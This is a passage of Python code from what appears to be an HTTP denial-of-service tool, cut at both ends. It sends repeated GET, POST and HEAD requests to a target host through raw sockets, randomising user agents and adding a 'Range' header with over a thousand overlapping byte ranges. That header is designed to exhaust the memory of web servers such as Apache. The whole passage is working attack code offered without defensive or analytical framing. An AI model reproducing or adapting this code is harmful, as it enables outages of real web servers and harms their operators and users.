			    "Range: bytes= 0-,1-0,1-1,1-2,1-3,1-4,1-5,1-6,1-7,1-8,1-9,1-10,1-11,1-12,1-13,1-14,1-15,1-16,1-17,1-18,1-19,1-20,1-21,1-22,1-23,1-24,1-25,1-26,1-27,1-28,1-29,1-30,1-31,1-32,1-33,1-34,1-35,1-36,1-37,1-38,1-39,1-40,1-41,1-42,1-43,1-44,1-45,1-46,1-47,1-48,1-49,1-50,1-51,1-52,1-53,1-54,1-55,1-56,1-57,1-58,1-59,1-60,1-61,1-62,1-63,1-64,1-65,1-66,1-67,1-68,1-69,1-70,1-71,1-72,1-73,1-74,1-75,1-76,1-77,1-78,1-79,1-80,1-81,1-82,1-83,1-84,1-85,1-86,1-87,1-88,1-89,1-90,1-91,1-92,1-93,1-94,1-95,1-96,1-97,1-98,1-99,1-100,1-101,1-102,1-103,1-104,1-105,1-106,1-107,1-108,1-109,1-110,1-111,1-112,1-113,1-114,1-115,1-116,1-117,1-118,1-119,1-120,1-121,1-122,1-123,1-124,1-125,1-126,1-127,1-128,1-129,1-130,1-131,1-132,1-133,1-134,1-135,1-136,1-137,1-138,1-139,1-140,1-141,1-142,1-143,1-144,1-145,1-146,1-147,1-148,1-149,1-150,1-151,1-152,1-153,1-154,1-155,1-156,1-157,1-158,1-159,1-160,1-161,1-162,1-163,1-164,1-165,1-166,1-167,1-168,1-169,1-170,1-171,1-172,1-173,1-174,1-175,1-176,1-177,1-178,1-179,1-180,1-181,1-182,1-183,1-184,1-185,1-186,1-187,1-188,1-189,1-190,1-191,1-192,1-193,1-194,1-195,1-196,1-197,1-198,1-199,1-200,1-201,1-202,1-203,1-204,1-205,1-206,1-207,1-208,1-209,1-210,1-211,1-212,1-213,1-214,1-215,1-216,1-217,1-218,1-219,1-220,1-221,1-222,1-223,1-224,1-225,1-226,1-227,1-228,1-229,1-230,1-231,1-232,1-233,1-234,1-235,1-236,1-237,1-238,1-239,1-240,1-241,1-242,1-243,1-244,1-245,1-246,1-247,1-248,1-249,1-250,1-251,1-252,1-253,1-254,1-255,1-256,1-257,1-258,1-259,1-260,1-261,1-262,1-263,1-264,1-265,1-266,1-267,1-268,1-269,1-270,1-271,1-272,1-273,1-274,1-275,1-276,1-277,1-278,1-279,1-280,1-281,1-282,1-283,1-284,1-285,1-286,1-287,1-288,1-289,1-290,1-291,1-292,1-293,1-294,1-295,1-296,1-297,1-298,1-299,1-300,1-301,1-302,1-303,1-304,1-305,1-306,1-307,1-308,1-309,1-310,1-311,1-312,1-313,1-314,1-315,1-316,1-317,1-318,1-319,1-320,1-321,1-322,1-323,1-324,1-325,1-326,1-327,1-328,1-329,1-330,1-331,1-332,1-333,1-334,1-335,1-336,1-337,1-338,1-339,1-340,1-341,1-342,1-343,1-344,1-345,1-346,1-347,1-348,1-349,1-350,1-351,1-352,1-353,1-354,1-355,1-356,1-357,1-358,1-359,1-360,1-361,1-362,1-363,1-364,1-365,1-366,1-367,1-368,1-369,1-370,1-371,1-372,1-373,1-374,1-375,1-376,1-377,1-378,1-379,1-380,1-381,1-382,1-383,1-384,1-385,1-386,1-387,1-388,1-389,1-390,1-391,1-392,1-393,1-394,1-395,1-396,1-397,1-398,1-399,1-400,1-401,1-402,1-403,1-404,1-405,1-406,1-407,1-408,1-409,1-410,1-411,1-412,1-413,1-414,1-415,1-416,1-417,1-418,1-419,1-420,1-421,1-422,1-423,1-424,1-425,1-426,1-427,1-428,1-429,1-430,1-431,1-432,1-433,1-434,1-435,1-436,1-437,1-438,1-439,1-440,1-441,1-442,1-443,1-444,1-445,1-446,1-447,1-448,1-449,1-450,1-451,1-452,1-453,1-454,1-455,1-456,1-457,1-458,1-459,1-460,1-461,1-462,1-463,1-464,1-465,1-466,1-467,1-468,1-469,1-470,1-471,1-472,1-473,1-474,1-475,1-476,1-477,1-478,1-479,1-480,1-481,1-482,1-483,1-484,1-485,1-486,1-487,1-488,1-489,1-490,1-491,1-492,1-493,1-494,1-495,1-496,1-497,1-498,1-499,1-500,1-501,1-502,1-503,1-504,1-505,1-506,1-507,1-508,1-509,1-510,1-511,1-512,1-513,1-514,1-515,1-516,1-517,1-518,1-519,1-520,1-521,1-522,1-523,1-524,1-525,1-526,1-527,1-528,1-529,1-530,1-531,1-532,1-533,1-534,1-535,1-536,1-537,1-538,1-539,1-540,1-541,1-542,1-543,1-544,1-545,1-546,1-547,1-548,1-549,1-550,1-551,1-552,1-553,1-554,1-555,1-556,1-557,1-558,1-559,1-560,1-561,1-562,1-563,1-564,1-565,1-566,1-567,1-568,1-569,1-570,1-571,1-572,1-573,1-574,1-575,1-576,1-577,1-578,1-579,1-580,1-581,1-582,1-583,1-584,1-585,1-586,1-587,1-588,1-589,1-590,1-591,1-592,1-593,1-594,1-595,1-596,1-597,1-598,1-599,1-600,1-601,1-602,1-603,1-604,1-605,1-606,1-607,1-608,1-609,1-610,1-611,1-612,1-613,1-614,1-615,1-616,1-617,1-618,1-619,1-620,1-621,1-622,1-623,1-624,1-625,1-626,1-627,1-628,1-629,1-630,1-631,1-632,1-633,1-634,1-635,1-636,1-637,1-638,1-639,1-640,1-641,1-642,1-643,1-644,1-645,1-646,1-647,1-648,1-649,1-650,1-651,1-652,1-653,1-654,1-655,1-656,1-657,1-658,1-659,1-660,1-661,1-662,1-663,1-664,1-665,1-666,1-667,1-668,1-669,1-670,1-671,1-672,1-673,1-674,1-675,1-676,1-677,1-678,1-679,1-680,1-681,1-682,1-683,1-684,1-685,1-686,1-687,1-688,1-689,1-690,1-691,1-692,1-693,1-694,1-695,1-696,1-697,1-698,1-699,1-700,1-701,1-702,1-703,1-704,1-705,1-706,1-707,1-708,1-709,1-710,1-711,1-712,1-713,1-714,1-715,1-716,1-717,1-718,1-719,1-720,1-721,1-722,1-723,1-724,1-725,1-726,1-727,1-728,1-729,1-730,1-731,1-732,1-733,1-734,1-735,1-736,1-737,1-738,1-739,1-740,1-741,1-742,1-743,1-744,1-745,1-746,1-747,1-748,1-749,1-750,1-751,1-752,1-753,1-754,1-755,1-756,1-757,1-758,1-759,1-760,1-761,1-762,1-763,1-764,1-765,1-766,1-767,1-768,1-769,1-770,1-771,1-772,1-773,1-774,1-775,1-776,1-777,1-778,1-779,1-780,1-781,1-782,1-783,1-784,1-785,1-786,1-787,1-788,1-789,1-790,1-791,1-792,1-793,1-794,1-795,1-796,1-797,1-798,1-799,1-800,1-801,1-802,1-803,1-804,1-805,1-806,1-807,1-808,1-809,1-810,1-811,1-812,1-813,1-814,1-815,1-816,1-817,1-818,1-819,1-820,1-821,1-822,1-823,1-824,1-825,1-826,1-827,1-828,1-829,1-830,1-831,1-832,1-833,1-834,1-835,1-836,1-837,1-838,1-839,1-840,1-841,1-842,1-843,1-844,1-845,1-846,1-847,1-848,1-849,1-850,1-851,1-852,1-853,1-854,1-855,1-856,1-857,1-858,1-859,1-860,1-861,1-862,1-863,1-864,1-865,1-866,1-867,1-868,1-869,1-870,1-871,1-872,1-873,1-874,1-875,1-876,1-877,1-878,1-879,1-880,1-881,1-882,1-883,1-884,1-885,1-886,1-887,1-888,1-889,1-890,1-891,1-892,1-893,1-894,1-895,1-896,1-897,1-898,1-899,1-900,1-901,1-902,1-903,1-904,1-905,1-906,1-907,1-908,1-909,1-910,1-911,1-912,1-913,1-914,1-915,1-916,1-917,1-918,1-919,1-920,1-921,1-922,1-923,1-924,1-925,1-926,1-927,1-928,1-929,1-930,1-931,1-932,1-933,1-934,1-935,1-936,1-937,1-938,1-939,1-940,1-941,1-942,1-943,1-944,1-945,1-946,1-947,1-948,1-949,1-950,1-951,1-952,1-953,1-954,1-955,1-956,1-957,1-958,1-959,1-960,1-961,1-962,1-963,1-964,1-965,1-966,1-967,1-968,1-969,1-970,1-971,1-972,1-973,1-974,1-975,1-976,1-977,1-978,1-979,1-980,1-981,1-982,1-983,1-984,1-985,1-986,1-987,1-988,1-989,1-990,1-991,1-992,1-993,1-994,1-995,1-996,1-997,1-998,1-999,1-1000,1-1001,1-1002,1-1003,1-1004,1-1005,1-1006,1-1007,1-1008,1-1009,1-1010,1-1011,1-1012,1-1013,1-1014,1-1015,1-1016,1-1017,1-1018,1-1019,1-1020,1-1021,1-1022,1-1023,1-1024,1-1025,1-1026,1-1027,1-1028,1-1029,1-1030,1-1031,1-1032,1-1033,1-1034,1-1035,1-1036,1-1037,1-1038,1-1039,1-1040,1-1041,1-1042,1-1043,1-1044,1-1045,1-1046,1-1047,1-1048,1-1049,1-1050,1-1051,1-1052,1-1053,1-1054,1-1055,1-1056,1-1057,1-1058,1-1059,1-1060,1-1061,1-1062,1-1063,1-1064,1-1065,1-1066,1-1067,1-1068,1-1069,1-1070,1-1071,1-1072,1-1073,1-1074,1-1075,1-1076,1-1077,1-1078,1-1079,1-1080,1-1081,1-1082,1-1083,1-1084,1-1085,1-1086,1-1087,1-1088,1-1089,1-1090,1-1091,1-1092,1-1093,1-1094,1-1095,1-1096,1-1097,1-1098,1-1099,1-1100,1-1101,1-1102,1-1103,1-1104,1-1105,1-1106,1-1107,1-1108,1-1109,1-1110,1-1111,1-1112,1-1113,1-1114,1-1115,1-1116,1-1117,1-1118,1-1119,1-1120,1-1121,1-1122,1-1123,1-1124,1-1125,1-1126,1-1127,1-1128,1-1129,1-1130,1-1131,1-1132,1-1133,1-1134,1-1135,1-1136,1-1137,1-1138,1-1139,1-1140,1-1141,1-1142,1-1143,1-1144,1-1145,1-1146,1-1147,1-1148,1-1149,1-1150,1-1151,1-1152,1-1153,1-1154,1-1155,1-1156,1-1157,1-1158,1-1159,1-1160,1-1161,1-1162,1-1163,1-1164,1-1165,1-1166,1-1167,1-1168,1-1169,1-1170,1-1171,1-1172,1-1173,1-1174,1-1175,1-1176,1-1177,1-1178,1-1179,1-1180,1-1181,1-1182,1-1183,1-1184,1-1185,1-1186,1-1187,1-1188,1-1189,1-1190,1-1191,1-1192,1-1193,1-1194,1-1195,1-1196,1-1197,1-1198,1-1199,1-1200,1-1201,1-1202,1-1203,1-1204,1-1205,1-1206,1-1207,1-1208,1-1209,1-1210,1-1211,1-1212,1-1213,1-1214,1-1215,1-1216,1-1217,1-1218,1-1219,1-1220,1-1221,1-1222,1-1223,1-1224,1-1225,1-1226,1-1227,1-1228,1-1229,1-1230,1-1231,1-1232,1-1233,1-1234,1-1235,1-1236,1-1237,1-1238,1-1239,1-1240,1-1241,1-1242,1-1243,1-1244,1-1245,1-1246,1-1247,1-1248,1-1249,1-1250,1-1251,1-1252,1-1253,1-1254,1-1255,1-1256,1-1257,1-1258,1-1259,1-1260,1-1261,1-1262,1-1263,1-1264,1-1265,1-1266,1-1267,1-1268,1-1269,1-1270,1-1271,1-1272,1-1273,1-1274,1-1275,1-1276,1-1277,1-1278,1-1279,1-1280,1-1281,1-1282,1-1283,1-1284,1-1285,1-1286,1-1287,1-1288,1-1289,1-1290,1-1291,1-1292,1-1293,1-1294,1-1295,1-1296,1-1297,1-1298,1-1299\r\n" 
			    "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
			    (random.choice(getss), self.host, random.choice(useragents)))

            self.socks.send("POST /%r HTTP/1.1\r\n"
			    "Host: %s\r\n"
			    "User-Agent: %s\r\n" "Referer: curl/7.30.0\r\n"
			    "Cache-Control: no-cache, max-age=0\r\n"
			    "Content-Length: 10000\r\n"
			    "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
			    (random.choice(getss), self.host, random.choice(useragents)))
           
            self.socks.send("GET /%r HTTP/1.1\r\n"
			    "User-Agent: %s\r\n" "Referer: curl/7.30.0\r\n"
			    "Cache-Control: no-cache, max-age=0\r\n"
			    "Content-Length: 10000\r\n"
			    "Connection: keep-alive\r\n"  
			    "Keep-Alive: 60\r\n" 
                            "Accept-Ranges: bytes\r\n" 
			    "Range: bytes= 0-,1-0,1-1,1-2,1-3,1-4,1-5,1-6,1-7,1-8,1-9,1-10,1-11,1-12,1-13,1-14,1-15,1-16,1-17,1-18,1-19,1-20,1-21,1-22,1-23,1-24,1-25,1-26,1-27,1-28,1-29,1-30,1-31,1-32,1-33,1-34,1-35,1-36,1-37,1-38,1-39,1-40,1-41,1-42,1-43,1-44,1-45,1-46,1-47,1-48,1-49,1-50,1-51,1-52,1-53,1-54,1-55,1-56,1-57,1-58,1-59,1-60,1-61,1-62,1-63,1-64,1-65,1-66,1-67,1-68,1-69,1-70,1-71,1-72,1-73,1-74,1-75,1-76,1-77,1-78,1-79,1-80,1-81,1-82,1-83,1-84,1-85,1-86,1-87,1-88,1-89,1-90,1-91,1-92,1-93,1-94,1-95,1-96,1-97,1-98,1-99,1-100,1-101,1-102,1-103,1-104,1-105,1-106,1-107,1-108,1-109,1-110,1-111,1-112,1-113,1-114,1-115,1-116,1-117,1-118,1-119,1-120,1-121,1-122,1-123,1-124,1-125,1-126,1-127,1-128,1-129,1-130,1-131,1-132,1-133,1-134,1-135,1-136,1-137,1-138,1-139,1-140,1-141,1-142,1-143,1-144,1-145,1-146,1-147,1-148,1-149,1-150,1-151,1-152,1-153,1-154,1-155,1-156,1-157,1-158,1-159,1-160,1-161,1-162,1-163,1-164,1-165,1-166,1-167,1-168,1-169,1-170,1-171,1-172,1-173,1-174,1-175,1-176,1-177,1-178,1-179,1-180,1-181,1-182,1-183,1-184,1-185,1-186,1-187,1-188,1-189,1-190,1-191,1-192,1-193,1-194,1-195,1-196,1-197,1-198,1-199,1-200,1-201,1-202,1-203,1-204,1-205,1-206,1-207,1-208,1-209,1-210,1-211,1-212,1-213,1-214,1-215,1-216,1-217,1-218,1-219,1-220,1-221,1-222,1-223,1-224,1-225,1-226,1-227,1-228,1-229,1-230,1-231,1-232,1-233,1-234,1-235,1-236,1-237,1-238,1-239,1-240,1-241,1-242,1-243,1-244,1-245,1-246,1-247,1-248,1-249,1-250,1-251,1-252,1-253,1-254,1-255,1-256,1-257,1-258,1-259,1-260,1-261,1-262,1-263,1-264,1-265,1-266,1-267,1-268,1-269,1-270,1-271,1-272,1-273,1-274,1-275,1-276,1-277,1-278,1-279,1-280,1-281,1-282,1-283,1-284,1-285,1-286,1-287,1-288,1-289,1-290,1-291,1-292,1-293,1-294,1-295,1-296,1-297,1-298,1-299,1-300,1-301,1-302,1-303,1-304,1-305,1-306,1-307,1-308,1-309,1-310,1-311,1-312,1-313,1-314,1-315,1-316,1-317,1-318,1-319,1-320,1-321,1-322,1-323,1-324,1-325,1-326,1-327,1-328,1-329,1-330,1-331,1-332,1-333,1-334,1-335,1-336,1-337,1-338,1-339,1-340,1-341,1-342,1-343,1-344,1-345,1-346,1-347,1-348,1-349,1-350,1-351,1-352,1-353,1-354,1-355,1-356,1-357,1-358,1-359,1-360,1-361,1-362,1-363,1-364,1-365,1-366,1-367,1-368,1-369,1-370,1-371,1-372,1-373,1-374,1-375,1-376,1-377,1-378,1-379,1-380,1-381,1-382,1-383,1-384,1-385,1-386,1-387,1-388,1-389,1-390,1-391,1-392,1-393,1-394,1-395,1-396,1-397,1-398,1-399,1-400,1-401,1-402,1-403,1-404,1-405,1-406,1-407,1-408,1-409,1-410,1-411,1-412,1-413,1-414,1-415,1-416,1-417,1-418,1-419,1-420,1-421,1-422,1-423,1-424,1-425,1-426,1-427,1-428,1-429,1-430,1-431,1-432,1-433,1-434,1-435,1-436,1-437,1-438,1-439,1-440,1-441,1-442,1-443,1-444,1-445,1-446,1-447,1-448,1-449,1-450,1-451,1-452,1-453,1-454,1-455,1-456,1-457,1-458,1-459,1-460,1-461,1-462,1-463,1-464,1-465,1-466,1-467,1-468,1-469,1-470,1-471,1-472,1-473,1-474,1-475,1-476,1-477,1-478,1-479,1-480,1-481,1-482,1-483,1-484,1-485,1-486,1-487,1-488,1-489,1-490,1-491,1-492,1-493,1-494,1-495,1-496,1-497,1-498,1-499,1-500,1-501,1-502,1-503,1-504,1-505,1-506,1-507,1-508,1-509,1-510,1-511,1-512,1-513,1-514,1-515,1-516,1-517,1-518,1-519,1-520,1-521,1-522,1-523,1-524,1-525,1-526,1-527,1-528,1-529,1-530,1-531,1-532,1-533,1-534,1-535,1-536,1-537,1-538,1-539,1-540,1-541,1-542,1-543,1-544,1-545,1-546,1-547,1-548,1-549,1-550,1-551,1-552,1-553,1-554,1-555,1-556,1-557,1-558,1-559,1-560,1-561,1-562,1-563,1-564,1-565,1-566,1-567,1-568,1-569,1-570,1-571,1-572,1-573,1-574,1-575,1-576,1-577,1-578,1-579,1-580,1-581,1-582,1-583,1-584,1-585,1-586,1-587,1-588,1-589,1-590,1-591,1-592,1-593,1-594,1-595,1-596,1-597,1-598,1-599,1-600,1-601,1-602,1-603,1-604,1-605,1-606,1-607,1-608,1-609,1-610,1-611,1-612,1-613,1-614,1-615,1-616,1-617,1-618,1-619,1-620,1-621,1-622,1-623,1-624,1-625,1-626,1-627,1-628,1-629,1-630,1-631,1-632,1-633,1-634,1-635,1-636,1-637,1-638,1-639,1-640,1-641,1-642,1-643,1-644,1-645,1-646,1-647,1-648,1-649,1-650,1-651,1-652,1-653,1-654,1-655,1-656,1-657,1-658,1-659,1-660,1-661,1-662,1-663,1-664,1-665,1-666,1-667,1-668,1-669,1-670,1-671,1-672,1-673,1-674,1-675,1-676,1-677,1-678,1-679,1-680,1-681,1-682,1-683,1-684,1-685,1-686,1-687,1-688,1-689,1-690,1-691,1-692,1-693,1-694,1-695,1-696,1-697,1-698,1-699,1-700,1-701,1-702,1-703,1-704,1-705,1-706,1-707,1-708,1-709,1-710,1-711,1-712,1-713,1-714,1-715,1-716,1-717,1-718,1-719,1-720,1-721,1-722,1-723,1-724,1-725,1-726,1-727,1-728,1-729,1-730,1-731,1-732,1-733,1-734,1-735,1-736,1-737,1-738,1-739,1-740,1-741,1-742,1-743,1-744,1-745,1-746,1-747,1-748,1-749,1-750,1-751,1-752,1-753,1-754,1-755,1-756,1-757,1-758,1-759,1-760,1-761,1-762,1-763,1-764,1-765,1-766,1-767,1-768,1-769,1-770,1-771,1-772,1-773,1-774,1-775,1-776,1-777,1-778,1-779,1-780,1-781,1-782,1-783,1-784,1-785,1-786,1-787,1-788,1-789,1-790,1-791,1-792,1-793,1-794,1-795,1-796,1-797,1-798,1-799,1-800,1-801,1-802,1-803,1-804,1-805,1-806,1-807,1-808,1-809,1-810,1-811,1-812,1-813,1-814,1-815,1-816,1-817,1-818,1-819,1-820,1-821,1-822,1-823,1-824,1-825,1-826,1-827,1-828,1-829,1-830,1-831,1-832,1-833,1-834,1-835,1-836,1-837,1-838,1-839,1-840,1-841,1-842,1-843,1-844,1-845,1-846,1-847,1-848,1-849,1-850,1-851,1-852,1-853,1-854,1-855,1-856,1-857,1-858,1-859,1-860,1-861,1-862,1-863,1-864,1-865,1-866,1-867,1-868,1-869,1-870,1-871,1-872,1-873,1-874,1-875,1-876,1-877,1-878,1-879,1-880,1-881,1-882,1-883,1-884,1-885,1-886,1-887,1-888,1-889,1-890,1-891,1-892,1-893,1-894,1-895,1-896,1-897,1-898,1-899,1-900,1-901,1-902,1-903,1-904,1-905,1-906,1-907,1-908,1-909,1-910,1-911,1-912,1-913,1-914,1-915,1-916,1-917,1-918,1-919,1-920,1-921,1-922,1-923,1-924,1-925,1-926,1-927,1-928,1-929,1-930,1-931,1-932,1-933,1-934,1-935,1-936,1-937,1-938,1-939,1-940,1-941,1-942,1-943,1-944,1-945,1-946,1-947,1-948,1-949,1-950,1-951,1-952,1-953,1-954,1-955,1-956,1-957,1-958,1-959,1-960,1-961,1-962,1-963,1-964,1-965,1-966,1-967,1-968,1-969,1-970,1-971,1-972,1-973,1-974,1-975,1-976,1-977,1-978,1-979,1-980,1-981,1-982,1-983,1-984,1-985,1-986,1-987,1-988,1-989,1-990,1-991,1-992,1-993,1-994,1-995,1-996,1-997,1-998,1-999,1-1000,1-1001,1-1002,1-1003,1-1004,1-1005,1-1006,1-1007,1-1008,1-1009,1-1010,1-1011,1-1012,1-1013,1-1014,1-1015,1-1016,1-1017,1-1018,1-1019,1-1020,1-1021,1-1022,1-1023,1-1024,1-1025,1-1026,1-1027,1-1028,1-1029,1-1030,1-1031,1-1032,1-1033,1-1034,1-1035,1-1036,1-1037,1-1038,1-1039,1-1040,1-1041,1-1042,1-1043,1-1044,1-1045,1-1046,1-1047,1-1048,1-1049,1-1050,1-1051,1-1052,1-1053,1-1054,1-1055,1-1056,1-1057,1-1058,1-1059,1-1060,1-1061,1-1062,1-1063,1-1064,1-1065,1-1066,1-1067,1-1068,1-1069,1-1070,1-1071,1-1072,1-1073,1-1074,1-1075,1-1076,1-1077,1-1078,1-1079,1-1080,1-1081,1-1082,1-1083,1-1084,1-1085,1-1086,1-1087,1-1088,1-1089,1-1090,1-1091,1-1092,1-1093,1-1094,1-1095,1-1096,1-1097,1-1098,1-1099,1-1100,1-1101,1-1102,1-1103,1-1104,1-1105,1-1106,1-1107,1-1108,1-1109,1-1110,1-1111,1-1112,1-1113,1-1114,1-1115,1-1116,1-1117,1-1118,1-1119,1-1120,1-1121,1-1122,1-1123,1-1124,1-1125,1-1126,1-1127,1-1128,1-1129,1-1130,1-1131,1-1132,1-1133,1-1134,1-1135,1-1136,1-1137,1-1138,1-1139,1-1140,1-1141,1-1142,1-1143,1-1144,1-1145,1-1146,1-1147,1-1148,1-1149,1-1150,1-1151,1-1152,1-1153,1-1154,1-1155,1-1156,1-1157,1-1158,1-1159,1-1160,1-1161,1-1162,1-1163,1-1164,1-1165,1-1166,1-1167,1-1168,1-1169,1-1170,1-1171,1-1172,1-1173,1-1174,1-1175,1-1176,1-1177,1-1178,1-1179,1-1180,1-1181,1-1182,1-1183,1-1184,1-1185,1-1186,1-1187,1-1188,1-1189,1-1190,1-1191,1-1192,1-1193,1-1194,1-1195,1-1196,1-1197,1-1198,1-1199,1-1200,1-1201,1-1202,1-1203,1-1204,1-1205,1-1206,1-1207,1-1208,1-1209,1-1210,1-1211,1-1212,1-1213,1-1214,1-1215,1-1216,1-1217,1-1218,1-1219,1-1220,1-1221,1-1222,1-1223,1-1224,1-1225,1-1226,1-1227,1-1228,1-1229,1-1230,1-1231,1-1232,1-1233,1-1234,1-1235,1-1236,1-1237,1-1238,1-1239,1-1240,1-1241,1-1242,1-1243,1-1244,1-1245,1-1246,1-1247,1-1248,1-1249,1-1250,1-1251,1-1252,1-1253,1-1254,1-1255,1-1256,1-1257,1-1258,1-1259,1-1260,1-1261,1-1262,1-1263,1-1264,1-1265,1-1266,1-1267,1-1268,1-1269,1-1270,1-1271,1-1272,1-1273,1-1274,1-1275,1-1276,1-1277,1-1278,1-1279,1-1280,1-1281,1-1282,1-1283,1-1284,1-1285,1-1286,1-1287,1-1288,1-1289,1-1290,1-1291,1-1292,1-1293,1-1294,1-1295,1-1296,1-1297,1-1298,1-1299\r\n" 
			    "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
			    (random.choice(getss), self.host, random.choice(useragents)))




	    self.socks.send("HEAD /%r HTTP/1.1\r\n" 
			    "Host: %s\r\n"
			    "User-Agent: %s\r\n" "Referer: curl/7.30.0\r\n"
			    "Cache-Control: no-cache, max-age=0\r\n"
			    "Connection: keep-alive\r\n"  
			    "Keep-Alive: 120\r\n" 
			    "Transfer-Encoding: chunked\r\n" 
			    "Accept-Ranges: bytes\r\n" 
			    "Range: bytes= 0-,1-0,1-1,1-2,1-3,1-4,1-5,1-6,1-7,1-8,1-9,1-10,1-11,1-12,1-13,1-14,1-15,1-16,1-17,1-18,1-19,1-20,1-21,1-22,1-23,1-24,1-25,1-26,1-27,1-28,1-29,1-30,1-31,1-32,1-33,1-34,1-35,1-36,1-37,1-38,1-39,1-40,1-41,1-42,1-43,1-44,1-45,1-46,1-47,1-48,1-49,1-50,1-51,1-52,1-53,1-54,1-55,1-56,1-57,1-58,1-59,1-60,1-61,1-62,1-63,1-64,1-65,1-66,1-67,1-68,1-69,1-70,1-71,1-72,1-73,1-74,1-75,1-76,1-77,1-78,1-79,1-80,1-81,1-82,1-83,1-84,1-85,1-86,1-87,1-88,1-89,1-90,1-91,1-92,1-93,1-94,1-95,1-96,1-97,1-98,1-99,1-100,1-101,1-102,1-103,1-104,1-105,1-106,1-107,1-108,1-109,1-110,1-111,1-112,1-113,1-114,1-115,1-116,1-117,1-118,1-119,1-120,1-121,1-122,1-123,1-124,1-125,1-126,1-127,1-128,1-129,1-130,1-131,1-132,1-133,1-134,1-135,1-136,1-137,1-138,1-139,1-140,1-141,1-142,1-143,1-144,1-145,1-146,1-147,1-148,1-149,1-150,1-151,1-152,1-153,1-154,1-155,1-156,1-157,1-158,1-159,1-160,1-161,1-162,1-163,1-164,1-165,1-166,1-167,1-168,1-169,1-170,1-171,1-172,1-173,1-174,1-175,1-176,1-177,1-178,1-179,1-180,1-181,1-182,1-183,1-184,1-185,1-186,1-187,1-188,1-189,1-190,1-191,1-192,1-193,1-194,1-195,1-196,1-197,1-198,1-199,1-200,1-201,1-202,1-203,1-204,1-205,1-206,1-207,1-208,1-209,1-210,1-211,1-212,1-213,1-214,1-215,1-216,1-217,1-218,1-219,1-220,1-221,1-222,1-223,1-224,1-225,1-226,1-227,1-228,1-229,1-230,1-231,1-232,1-233,1-234,1-235,1-236,1-237,1-238,1-239,1-240,1-241,1-242,1-243,1-244,1-245,1-246,1-247,1-248,1-249,1-250,1-251,1-252,1-253,1-254,1-255,1-256,1-257,1-258,1-259,1-260,1-261,1-262,1-263,1-264,1-265,1-266,1-267,1-268,1-269,1-270,1-271,1-272,1-273,1-274,1-275,1-276,1-277,1-278,1-279,1-280,1-281,1-282,1-283,1-284,1-285,1-286,1-287,1-288,1-289,1-290,1-291,1-292,1-293,1-294,1-295,1-296,1-297,1-298,1-299,1-300,1-301,1-302,1-303,1-304,1-305,1-306,1-307,1-308,1-309,1-310,1-311,1-312,1-313,1-314,1-315,1-316,1-317,1-318,1-319,1-320,1-321,1-322,1-323,1-324,1-325,1-326,1-327,1-328,1-329,1-330,1-331,1-332,1-333,1-334,1-335,1-336,1-337,1-338,1-339,1-340,1-341,1-342,1-343,1-344,1-345,1-346,1-347,1-348,1-349,1-350,1-351,1-352,1-353,1-354,1-355,1-356,1-357,1-358,1-359,1-360,1-361,1-362,1-363,1-364,1-365,1-366,1-367,1-368,1-369,1-370,1-371,1-372,1-373,1-374,1-375,1-376,1-377,1-378,1-379,1-380,1-381,1-382,1-383,1-384,1-385,1-386,1-387,1-388,1-389,1-390,1-391,1-392,1-393,1-394,1-395,1-396,1-397,1-398,1-399,1-400,1-401,1-402,1-403,1-404,1-405,1-406,1-407,1-408,1-409,1-410,1-411,1-412,1-413,1-414,1-415,1-416,1-417,1-418,1-419,1-420,1-421,1-422,1-423,1-424,1-425,1-426,1-427,1-428,1-429,1-430,1-431,1-432,1-433,1-434,1-435,1-436,1-437,1-438,1-439,1-440,1-441,1-442,1-443,1-444,1-445,1-446,1-447,1-448,1-449,1-450,1-451,1-452,1-453,1-454,1-455,1-456,1-457,1-458,1-459,1-460,1-461,1-462,1-463,1-464,1-465,1-466,1-467,1-468,1-469,1-470,1-471,1-472,1-473,1-474,1-475,1-476,1-477,1-478,1-479,1-480,1-481,1-482,1-483,1-484,1-485,1-486,1-487,1-488,1-489,1-490,1-491,1-492,1-493,1-494,1-495,1-496,1-497,1-498,1-499,1-500,1-501,1-502,1-503,1-504,1-505,1-506,1-507,1-508,1-509,1-510,1-511,1-512,1-513,1-514,1-515,1-516,1-517,1-518,1-519,1-520,1-521,1-522,1-523,1-524,1-525,1-526,1-527,1-528,1-529,1-530,1-531,1-532,1-533,1-534,1-535,1-536,1-537,1-538,1-539,1-540,1-541,1-542,1-543,1-544,1-545,1-546,1-547,1-548,1-549,1-550,1-551,1-552,1-553,1-554,1-555,1-556,1-557,1-558,1-559,1-560,1-561,1-562,1-563,1-564,1-565,1-566,1-567,1-568,1-569,1-570,1-571,1-572,1-573,1-574,1-575,1-576,1-577,1-578,1-579,1-580,1-581,1-582,1-583,1-584,1-585,1-586,1-587,1-588,1-589,1-590,1-591,1-592,1-593,1-594,1-595,1-596,1-597,1-598,1-599,1-600,1-601,1-602,1-603,1-604,1-605,1-606,1-607,1-608,1-609,1-610,1-611,1-612,1-613,1-614,1-615,1-616,1-617,1-618,1-619,1-620,1-621,1-622,1-623,1-624,1-625,1-626,1-627,1-628,1-629,1-630,1-631,1-632,1-633,1-634,1-635,1-636,1-637,1-638,1-639,1-640,1-641,1-642,1-643,1-644,1-645,1-646,1-647,1-648,1-649,1-650,1-651,1-652,1-653,1-654,1-655,1-656,1-657,1-658,1-659,1-660,1-661,1-662,1-663,1-664,1-665,1-666,1-667,1-668,1-669,1-670,1-671,1-672,1-673,1-674,1-675,1-676,1-677,1-678,1-679,1-680,1-681,1-682,1-683,1-684,1-685,1-686,1-687,1-688,1-689,1-690,1-691,1-692,1-693,1-694,1-695,1-696,1-697,1-698,1-699,1-700,1-701,1-702,1-703,1-704,1-705,1-706,1-707,1-708,1-709,1-710,1-711,1-712,1-713,1-714,1-715,1-716,1-717,1-718,1-719,1-720,1-721,1-722,1-723,1-724,1-725,1-726,1-727,1-728,1-729,1-730,1-731,1-732,1-733,1-734,1-735,1-736,1-737,1-738,1-739,1-740,1-741,1-742,1-743,1-744,1-745,1-746,1-747,1-748,1-749,1-750,1-751,1-752,1-753,1-754,1-755,1-756,1-757,1-758,1-759,1-760,1-761,1-762,1-763,1-764,1-765,1-766,1-767,1-768,1-769,1-770,1-771,1-772,1-773,1-774,1-775,1-776,1-777,1-778,1-779,1-780,1-781,1-782,1-783,1-784,1-785,1-786,1-787,1-788,1-789,1-790,1-791,1-792,1-793,1-794,1-795,1-796,1-797,1-798,1-799,1-800,1-801,1-802,1-803,1-804,1-805,1-806,1-807,1-808,1-809,1-810,1-811,1-812,1-813,1-814,1-815,1-816,1-817,1-818,1-819,1-820,1-8